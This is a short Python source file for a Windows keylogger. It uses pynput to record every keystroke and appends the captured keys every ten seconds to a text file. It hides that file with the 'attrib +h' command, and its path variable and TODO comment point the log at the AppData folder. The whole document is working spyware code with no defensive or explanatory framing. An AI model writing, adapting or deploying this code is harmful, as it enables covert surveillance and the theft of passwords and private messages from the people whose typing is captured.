import pynput.keyboard
import threading
import os

keys = ""
path = os.environ['appdata'] + "\keylogger.txt"


def process_keys(key):
    global keys

    try:
        keys = keys + str(key.char)
    except AttributeError:
        if key == key.space:
            keys = keys + " "
        else:
            keys = keys + " " + str(key) + " "


def print_keys():
    global keys

    # TODO: Replace "Keylogger.txt" with path to store in ....\Appdata\Roaming
    fin = open("keylogger.txt", "a")
    fin.write(keys)

    os.system(f"attrib +h {fin.name}")

    keys = ""
    timer = threading.Timer(10, print_keys)
    timer.start()


def start():
    keyboard_listener = pynput.keyboard.Listener(on_press=process_keys)
    with keyboard_listener:
        print_keys()
        keyboard_listener.join()
